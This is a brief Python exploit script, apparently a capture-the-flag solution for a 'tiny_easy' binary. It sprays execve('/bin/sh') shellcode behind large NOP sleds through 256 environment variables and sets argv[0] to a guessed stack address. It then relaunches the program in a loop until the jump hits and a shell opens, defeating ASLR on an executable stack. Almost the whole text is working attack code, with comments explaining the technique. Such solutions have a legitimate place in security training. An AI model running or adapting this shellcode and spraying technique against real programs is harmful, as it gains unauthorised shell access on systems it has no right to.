###pwntool has problem passing large data, so exploit locally
import os
import subprocess

target = b'\x88\x88\x88\xff'
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
nop_sled = b'\x90'*0x1000
payload = nop_sled+shellcode

env = {str(i):payload for i in range(0x100)}


###Exploit
#  the program performs 
#      pop edx (argv[0])
#      mov edx, [edx]
#      call edx
#  so we have to set argv[0] to an executable addr
#  NX for stack is off, but ASLR is on
#  Stack Spraying :
#      pass shellcode in environment variables(will be written on stack)
#      then use nop sleds to increase chance of executing shellcode

while True:
	p = subprocess.Popen([target],executable='/home/tiny_easy/tiny_easy',env=env)
	(pid,status) = os.wait()
	if os.WIFEXITED(status):
		break
